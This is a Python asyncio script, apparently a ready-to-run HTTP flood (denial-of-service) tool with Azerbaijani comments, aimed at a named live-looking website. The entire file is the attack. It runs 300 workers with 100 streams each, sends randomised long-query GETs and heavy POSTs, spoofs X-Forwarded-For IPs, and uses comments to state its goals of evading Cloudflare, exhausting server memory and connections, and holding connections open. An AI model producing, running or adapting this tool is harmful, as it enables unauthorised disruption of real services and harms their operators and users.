import asyncio
import httpx
import random
import string
import time

# --- ULTIMATE CONFIG ---
TARGET_URL = "https://streamwin.win"
# Railway üçün maksimal asinxron tutumu
WORKERS = 300 
# Hər bağlantıda açılan asinxron stream sayı
STREAMS = 100 

def r_str(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def supernova_strike(worker_id, client):
    # Hər worker fərqli bir TLS fingerprint təqlidi edir
    headers = {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,5)}.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Connection": "keep-alive",
        "X-Requested-With": "XMLHttpRequest",
        "Upgrade-Insecure-Requests": "1",
        "TE": "trailers" # HTTP/2 spesifik başlığı
    }

    while True:
        try:
            # Serverin daxili loglarını dolduran "Long-Query" URL
            url = f"{TARGET_URL}/?{r_str(8)}={r_str(20)}&search={r_str(100)}&v={time.time()}"
            
            # Dalğalı Hücum (Burst Mode)
            tasks = []
            for i in range(STREAMS):
                h = headers.copy()
                # Cloudflare analitikasını çaşdırmaq üçün hər stream-ə fərqli IP təqlidi
                ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                h["X-Forwarded-For"] = ip
                
                # Ağır POST və GET kombinasiyası
                if i % 3 == 0:
                    # Büyük payload (Server RAM-ını hədəf alır)
                    tasks.append(client.post(url, headers=h, content=r_str(2000)))
                else:
                    # Sürətli GET (Connection limitini hədəf alır)
                    tasks.append(client.get(url, headers=h))

            # Bütün "Supernova" dalğasını bir anda serverə burax
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Serverə bağlantıları bağlamağa fürsət vermə (Attack persistence)
            await asyncio.sleep(0.0001)

        except Exception:
            await asyncio.sleep(0.1)

async def main():
    print(f"🌟 SUPERNOVA ACTIVATED: {TARGET_URL}")
    print(f"[*] Total Targeted RPS: {WORKERS * STREAMS}+")
    
    # TCP hüdudlarını və bağlantı limitlərini tamamilə ləğv edən konfiqurasiya
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    async with httpx.AsyncClient(
        http2=True,          # Cloudflare Bypass və Stream Flooding üçün mütləqdir
        verify=False, 
        limits=limits, 
        timeout=15.0,        # Server donanda bağlantını 'asılı' saxlamaq üçün (Slowloris)
    ) as client:
        
        workers = [supernova_strike(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
